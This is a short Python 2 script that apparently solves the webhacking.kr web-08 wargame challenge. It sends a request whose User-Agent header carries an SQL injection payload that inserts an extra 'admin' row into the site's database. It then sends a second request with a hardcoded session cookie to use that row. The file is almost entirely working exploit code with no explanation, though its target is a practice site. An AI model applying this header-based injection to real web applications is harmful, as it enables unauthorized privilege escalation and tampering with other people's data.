#-*- coding: utf-8 -*-
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/web/web-08/"

httpRequest = urllib2.Request(challengeUrl)
httpRequest.add_header("User-Agent", "bindon', 'ip', 'admin'), ('dummy")
CookieManager.addCookie("PHPSESSID", "d106ebfb4bba898681f92c7f5316fa6b")
httpRequest.add_header("Cookie", CookieManager.getCookie())

try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

httpRequest.add_header("User-Agent", "bindon")
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: 'POST'

try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
